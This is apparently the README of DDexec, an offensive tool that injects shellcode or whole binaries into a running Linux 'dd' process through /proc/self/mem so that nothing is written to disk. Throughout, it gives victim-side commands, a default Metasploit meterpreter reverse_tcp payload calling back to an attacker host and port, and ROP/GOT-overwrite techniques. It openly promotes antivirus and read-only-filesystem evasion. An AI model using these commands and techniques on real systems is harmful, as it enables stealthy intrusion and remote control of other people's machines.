# DDexec

## Installation
```bash
sudo apt-get update
sudo apt-get install readelf objdump xclip -y # xclip is optional but recommended 
sudo pip3 install ROPGadget
```

## Execution
First of all you need to to **download some files from the victim system**:
- **Dowload the `dd` binary**. Find it with `command -v dd`. This is required.
- **Download the libc library**. Find it with `ldd $(command -v dd) | grep libc | cut -d' ' -f3`. *This is required with mode "retsled"*.
- **Get the Libc base address from the target executing: `printf "0x";(linux64 -R setarch $ARCH -R cat /proc/self/maps || setarch `arch` -R cat /proc/self/maps) | grep libc | head -n1 | cut -d'-' -f1`**

*Note that in the **STDOUT is only going to be printed the commands to execute in the victim machine**. Banner, information and logs are printed in STDERR.*

Then execute `DDexec.sh` with `xclip` and the **clipboard will be populated** with the command line you need to run in the victim system.
```bash
bash DDexec.sh -l /tmp/victim/libc.so.6 -d /tmp/victim/dd -a x86_64 -H 127.0.0.1 -P 4444 -p linux/x64/meterpreter/reverse_tcp | xclip -selection clipboard
```
**Paste the clipboard in the reverse-shell of the victim and the shellcode/binary will be run.**
*To run a binary you need to use the argument `-b`. Please, read the **Binary Load** section to learn how*

## Help
```
Use this program to execute shellcodes and binaries in memory.
Arguments:
    -h Print this help
    -d Path to the victim dd binary (you should download it from the victim). Find it with 'command -v dd' Required.
    -l Path to the victim libc (you should download it from the victim). Find it with 'ldd `command -v dd` | grep libc | cut -d' ' -f3'. Required with mode "retsled".
    -H LHOST to receive the meterpreter
    -P LPORT to receive the meterpreter.
    -p Metasploit payload (by default linux/x64/meterpreter/reverse_tcp)
    -a Architecture of the victim system. Get it with 'uname -m'. Required.
    -m Mode of memory load. By default fclose_got if dd binary not protected with full relro, if protected, retsled is forced.
    -s Shellcode to execute in hex "4831c0b002...". If msfvenom params are given, msfvenom will create a shellcode. By default a shellcode that echoes "Pwnd!" is used.
    -b Binary to load in memory. It has to be either statically linked or use the same dynamic libs as on a target machine.

e.g.: DDexec.sh -d /path/to/dd [-l /path/to/libc] -P 4444 -H 10.10.10.10 -a x86_64 [-m <fclose_got,retsled> (default fclose_got)] [-s <shellcode_hex>]
```

## Explanation
DDexec is a technique to **load arbitrary shellcodes and binaries in memory from a shell** in a linux system without needing to write anything into disk.

This can help you **avoid AVs and protections** (*like a filesystem mounted as Read Only*).

Basically, this program will prepare a cmd line that will make **`dd` overwrite itself during execution in memory and execute a defined shellcode or a different binary.**

Therefore, what the prepared cmd line is going to do is to use **`dd` to write a shellcode its own memory (via */proc/self/mem*) and then get control the RIP of the dd process to execute the shellcode**.

In order to control the RIP **2 techniques** are implemented in `DDexec.sh`:

### Retsled
**This technique was defined and developed by [Arget](https://github.com/arget13) a good friend of mine and a really awesome guy in binary exploitation.**

This technique uses a **retsled to overwrite an important part of the stack of the proccess with the goal of overwritting a RIP address** inside the stack with a series of RET. At the end of the retsled a ROP chain is located, so once the RIP is controled by a RET instruction of the retsled the execution will arrive to the ROP chain.

This ROP chain will read the shellcode usnig the `read()` function from `libc` and write it in `0x0000555555554000`.

*This technique generates a **bigger cmd line** than then next technique, maily because of the retsled, but **works with any `dd`**. It's the default technique used by DDexec when the dd binary is protected with full relro.*

#### Retsled Address
In order to control the RIP the retsled needs to **overwrite the return RIP address saved in the stack by any other function**. In order to do that, the retsled DDexec uses is overwritting a page from the address `0x7fffffffe000`. This is because, testing different DD binaries it was found that, with ASLR disabled, the **return of the write function** called by DD is saved in there and **that function doesn't have a stack canary**.

You can check that doing:
```bash
gdb dd
> set exec-wrapper env -i
> b *wrire
> run if=/dev/random of=/dev/null bs=5555 seek=55555555555555 conv=notrunc oflag=seek_bytes count=1
> i r $rsp
rsp            0x7fffffffeb88
# Check that address of $rsp is inside the offset overwritten
```

### fclose GOT
Based on the technique described in https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.md this technique **writes the shellcode in the GOT** of the last function executed by `dd` before exiting: **`fclose`**. Therefore, when **`fclose` is executed, the shellcode will be executed instead**.

*This technique **won't work if the `dd` binary is protected with full relro** because then the GOT table isn't writable*


*Both techniques are possible because the **ASLR is disabled** when executing `dd` using `setarch`.*

### Binary load
This technique was taken from **https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.mdaslr**.

In orer to **load a binary inside dd and execute it** the following steps are performed:
- Use a shellcode which will create a memfd file in a memory. This is done using the system call *memfd_create()* which creates an anonymous file and returns a file descriptor that refers to it. The file **behaves like a regular file. However, it lives in RAM** and is automatically released when all references to it are dropped.
- Inject the shellcode into a `dd` process (using one of the 2 previous techniques)
- 'suspend' the dd process (also done by the shellcode). Then, the memfd won't be deleted as long as the `dd` process is running.
- Write the binary to be executed inside the memfd file, and execute it.

To perform this steps with `DDexec.sh` you need to **indicate with the `-b` argument the path to the binary** you want to load in memory:
```bash
bash DDexec.sh -l /tmp/victim/libc.so.6 -d /tmp/victim/dd -a x86_64 -b /path/to/bin | xclip -selection clipboard
```
Then, **execute the new cmd line of the clipboard inside the target system**.
This will generate a new `dd` process which will have created and **exposed a memfd file** and suspended its execution (so it doesn't die).
You can see the new memf file exposed running:
```bash
ls -l /proc/$(pidof dd)/fd/
total 0
lrwx------ 1 kali kali 64 Dec 27 12:22 0 -> '/memfd:AAAA (deleted)'
lrwx------ 1 kali kali 64 Dec 27 12:25 2 -> /dev/pts/4
```
Notice how one of the file descriptors is **`memfd` aparently "deleted"**. Note how the fd is `0` (in this example).

Then, to **load the binary in memory** you just need to **write it in this file**. For that purpose `DDexec.sh` will have echoed **a cmd line prepared to decode the base64 of the binary and write it in the file descriptor** (*change the fd index of the cmd line if necessary*).

Just execute that cmd line in the target system. It will look like this:
```bash
# Change the fd number if necesSary
echo 'f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAYGEAAAAAAABAAAAAAAAAAGg3AgAAAAAAAAAAAEAAOAALAEAAHgAdA...' | base64 -d > /proc/\$(pidof dd)/fd/0
```

Once you have executed this cmd line, you will have **loaded the binary in memory in that memfd**. So you can just execute it as a normal binary:
```bash
# Doing this you will be executing the loaded binary
## Change the fd number
/proc/\$(pidof dd)/fd/<num>
```
